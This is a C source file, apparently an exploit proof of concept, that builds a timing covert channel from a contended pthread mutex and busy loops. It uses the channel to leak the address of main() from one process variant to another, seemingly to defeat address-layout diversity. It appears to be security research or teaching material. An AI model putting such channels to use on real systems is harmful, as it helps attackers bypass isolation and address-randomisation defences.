#include <inttypes.h>
#include <stdio.h>
#include <time.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <pthread.h>

#define LOOP_COUNT      100000000
#define LOOPDELAY_COUNT 10000000
#define SEND_NR_BITS    64
#define HIGH_BIT_MASK   (1ULL << 63)

/* As in the other exploit */
int ismaster_guess() {
	if (((long)ismaster_guess) & 0x4000)
		return 1;
	return 0;
}

pthread_mutex_t mutex;

/* Thread 2 */
void* receive_bit(void* unused) {
	if (pthread_mutex_trylock(&mutex) == 0) {
		/* If we acquire the lock: other thread
		   immediately released the mutex => 0 */
		pthread_mutex_unlock(&mutex);
		return (void*) 0;
	}
	return (void*) 1;
}

volatile long dummy;

/* Thread 1 */
void* send_bit(void* b) {
	pthread_mutex_lock(&mutex);
	for (int i = 0; i < (long)b * LOOP_COUNT; i++)
		dummy = 0;
	pthread_mutex_unlock(&mutex);
	return NULL;
}

long do_threads(int send, long bitvalue) {
	pthread_t thread1, thread2;
	void* result_rcv = NULL;

	if (send) {
		pthread_create(&thread1, NULL,
					   send_bit, (void*)bitvalue);
	} else {
		pthread_create(&thread1, NULL,
					   send_bit, NULL);
	}

	/* Teensy delay */
	for (int i = 0; i < LOOPDELAY_COUNT; i++)
		dummy = 0;

	pthread_create(&thread2, NULL, receive_bit, NULL);

	pthread_join(thread1, NULL);
	pthread_join(thread2, &result_rcv);

	return (long)result_rcv;
}

void send_pointer(void* ptr_) {
	uint64_t ptr = (uint64_t) ptr_;
	for (int i = 0; i < SEND_NR_BITS; i++) {
		if (ptr & HIGH_BIT_MASK)
			do_threads(1, 1);
		else
			do_threads(1, 0);
		ptr <<= 1;
	}
}

void* receive_pointer() {
	uint64_t ptr = 0;
	for (int i = 0; i < SEND_NR_BITS; i++) {
		ptr <<= 1;
		ptr |= do_threads(0, 0);
	}
	return (void*) ptr;
}

void* communicate(void* input, int shouldsend) {
	if (shouldsend) {
		send_pointer(input);
		return input;
	}
	return receive_pointer();
}

int main() {
	void* pointer;

	if (ismaster_guess() == 0) {
		pointer = communicate((void*)(main), 1);
	} else {
		pointer = communicate((void*)(main), 0);
	}

	printf("\t&main() in master: %p\n", pointer);
}
